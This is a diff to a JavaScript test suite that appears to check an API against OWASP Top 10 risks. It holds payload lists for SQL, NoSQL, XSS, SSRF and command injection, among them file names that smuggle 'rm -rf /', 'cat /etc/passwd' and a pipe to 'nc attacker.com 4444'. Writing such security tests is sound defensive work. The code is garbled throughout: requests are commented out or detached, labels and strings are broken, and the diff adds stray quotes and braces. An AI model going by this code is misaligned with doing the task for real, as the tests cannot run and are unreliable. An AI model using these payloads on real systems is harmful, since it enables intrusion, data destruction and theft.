@@ -12,9 +12,9 @@ describe('OWASP Top 10 Security Tests', () => {
   afterAll(async () => {
   // await new Promise((resolve) => server.close(resolve));
   });
-  describe('A01) => {
+  describe('A01) => {'
     it('should prevent unauthorized access to user data', async () => {
-      // Try to access another user's data
+      // Try to access another user's data'
 // const _response = awaitrequest(server);
 get('/api/v1/users/999/profile')
 set('Authorization', authToken)
@@ -44,7 +44,7 @@ expect(400)
         'project_-1',
         'project_null',
         'project_undefined',
-        'project_../../admin', ];
+        'project_../../admin'];
       for (const _id of manipulatedIds) {
 // const _response = awaitrequest(server);
 get(`/api/v1/projects/\$id`)
@@ -54,7 +54,7 @@ expect(404)
 // }
     });
   });
-  describe('A02) => {
+  describe('A02) => {'
     it('should use HTTPS in production', async () => {
 // const _response = awaitrequest(server);
 get('/api/v1/config/security')
@@ -83,14 +83,14 @@ expect(200)
       expect(response.body.keyManagement).toBe('HSM');
     });
   });
-  describe('A03) => {
+  describe('A03) => {'
     it('should prevent SQL injection', async () => {
       const _sqlInjectionPayloads = [
 
-        "'; DROP TABLE users; --",
+        "'; DROP TABLE users; --",'
         "1' OR '1'='1",
-        "admin'--",
-        "1; SELECT * FROM users WHERE 't' = 't", ];
+        "admin'--",'
+        "1; SELECT * FROM users WHERE 't' = 't"];'
       for (const _payload of sqlInjectionPayloads) {
 // const _response = awaitrequest(server);
 get(`/api/v1/search?q=\$encodeURIComponent(payload)`)
@@ -106,7 +106,7 @@ expect(200)
 
         { $ne },
         { $gt: '' },
-        { $where: 'this.password === this.password' }, ];
+        { $where: 'this.password === this.password' }];
       for (const _payload of noSqlPayloads) {
 // const _response = awaitrequest(server);
 post('/api/v1/users/search')
@@ -123,7 +123,7 @@ expect(400)
 
         'test.png; rm -rf /',
         'test.png && cat /etc/passwd',
-        'test.png | nc attacker.com 4444', ];
+        'test.png | nc attacker.com 4444'];
       for (const _payload of commandInjectionPayloads) {
 // const _response = awaitrequest(server);
 post('/api/v1/images/process')
@@ -141,7 +141,7 @@ expect(400)
         '<script>alert("XSS")</script>',
         '<img src=x onerror=alert(1)>',
         'javascript:alert(1)',
-        '<svg/onload=alert(1)>', ];
+        '<svg/onload=alert(1)>'];
       for (const _payload of xssPayloads) {
 // const _response = awaitrequest(server);
 post('/api/v1/projects')
@@ -152,12 +152,12 @@ send(
 expect(201)
         // Check that HTML is escaped
         expect(response.body.data.name).not.toContain('<script>');
-        expect(response.body.data.name).not.toContain('javascript);
+        expect(response.body.data.name).not.toContain('javascript);'
         expect(response.body.data.description).not.toContain('onerror=');
 // }
     });
   });
-  describe('A04) => {
+  describe('A04) => {'
     it('should enforce business logic constraints', async () => {
       // Try to create more projects than allowed
       const _maxProjects = 10;
@@ -197,7 +197,7 @@ expect(400)
       expect(response.body.error.code).toBe('INVALID_WORKFLOW');
     });
   });
-  describe('A05) => {
+  describe('A05) => {'
     it('should not expose sensitive headers', async () => {
 // const _response = awaitrequest(server).get('/health').expect(200);
       // Check that sensitive headers are not exposed
@@ -211,7 +211,7 @@ options('/api/v1/images/upload')
 set('Origin', 'https://evil.com')
 expect(204)
       // Should not allow arbitrary origins
-      expect(response.headers['access-control-allow-origin']).not.toBe('https);
+      expect(response.headers['access-control-allow-origin']).not.toBe('https);'
       expect(response.headers['access-control-allow-origin']).not.toBe('*');
     });
     it('should not expose debug information in production', async () => {
@@ -242,7 +242,7 @@ expect(200)
 // }
     });
   });
-  describe('A06) => {
+  describe('A06) => {'
     it('should check for vulnerable dependencies', async () => {
 // const _response = awaitrequest(server);
 get('/api/v1/health/dependencies')
@@ -252,7 +252,7 @@ expect(200)
       expect(response.body.outdated).toEqual([]);
     });
   });
-  describe('A07) => {
+  describe('A07) => {'
     it('should enforce strong password requirements', async () => {
       const _weakPasswords = ['123456', 'password', 'qwerty', 'abc123', 'password123'];
       for (const _password of weakPasswords) {
@@ -300,7 +300,7 @@ expect(200)
     expect(sessionResponse.body.data).toHaveProperty('ipAddress');
   });
 });
-describe('A08) => {
+describe('A08) => {'
   it('should verify file integrity on upload', async () => {
 // const _mockImage = awaitTestHelpers.createMockImage();
     const _tamperedChecksum = 'invalid-checksum';
@@ -323,7 +323,7 @@ expect(401)
   expect(response.body.error.code).toBe('INVALID_SIGNATURE');
 });
 })
-describe('A09) => {
+describe('A09) => {'
   it('should log security events', async () => {
     // Trigger a security event (failed login)
   // await request(server);
@@ -354,7 +354,7 @@ set('Authorization', authToken)
 set('X-Forwarded-For', '192.168.1.100')
       //       )
 // }
-  // await Promise.all(requests);
+  // // await Promise.all(requests);
     // Check anomaly detection logs
 // const _anomalyResponse = awaitrequest(server);
 get('/api/v1/admin/logs/anomalies')
@@ -372,7 +372,7 @@ describe('A10: Server-Side Request Forgery (SSRF)', () => {
         'http://127.0.0.1:22',
         'http://169.254.169.254/latest/meta-data/',
         'file:///etc/passwd',
-        'gopher://localhost:3306', ];
+        'gopher://localhost:3306'];
     for (const payload of ssrfPayloads) {
 // const _response = awaitrequest(server);
 post('/api/v1/images/import')
@@ -389,7 +389,7 @@ expect(400)
 
         'http://localhost/webhook',
         'http://10.0.0.1/webhook',
-        'http://192.168.1.1/webhook', ];
+        'http://192.168.1.1/webhook'];
     for (const url of internalUrls) {
 // const _response = awaitrequest(server);
 post('/api/v1/webhooks/configure')
@@ -422,7 +422,7 @@ it('should prevent timing attacks on authentication', async () => {
         { email: 'invalid@example.com', exists } ];
       for (const user of users) {
         const _start = process.hrtime.bigint();
-  // await request(server).post('/api/v1/auth/login').send({
+  // // await request(server).post('/api/v1/auth/login').send({
           email);
         const _end = process.hrtime.bigint();
         const _duration = Number(end - start) / 1e6; // Convert to ms
@@ -445,3 +445,4 @@ it('should implement Content Security Policy', async () => {
 });
 })
 })
+}}}
